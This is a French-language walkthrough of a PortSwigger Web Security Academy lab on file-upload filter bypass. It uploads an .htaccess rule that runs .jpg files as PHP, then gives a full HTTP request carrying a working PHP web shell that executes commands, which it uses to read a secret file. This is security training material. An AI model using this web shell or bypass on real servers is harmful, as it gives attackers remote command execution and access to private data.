# Lab

https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

## Solution

Les fichiers php ne sont pas autorisés à l'upload et les contournements en `php5` et `phtml` ne fonctionnent pas non plus.

En revanche, onpeut uploader un fichier `.htaccess` qui va permettre d'executer du php via une autre extension dans le dossier `/files/avatars` :

```bash
AddType application/x-httpd-php .jpg
```

Ainsi, on peut uploader un fichier php avec l'extension `.jpg` et l'executer.

```http
POST /my-account/avatar HTTP/2
Host: 0a3200c504427ca780fa8ff100890069.web-security-academy.net
Cookie: session=sqgevvnl5hwUtm3htEthXY61QBMcUAN9
Content-Length: 745
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3200c504427ca780fa8ff100890069.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3EiD515wcz0AvM80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3200c504427ca780fa8ff100890069.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundary3EiD515wcz0AvM80
Content-Disposition: form-data; name="avatar"; filename="simple.jpg"
Content-Type: application/octet-stream

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2&<1');
    }
?>
</pre>
</body>
</html>
------WebKitFormBoundary3EiD515wcz0AvM80
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary3EiD515wcz0AvM80
Content-Disposition: form-data; name="csrf"

hvCLFMQLN0P5iKM5h8v5E9shDiWDhhNT
------WebKitFormBoundary3EiD515wcz0AvM80--
```

Puis maintenant, on peut executer des commandes comme `cat /home/carlos/secret`.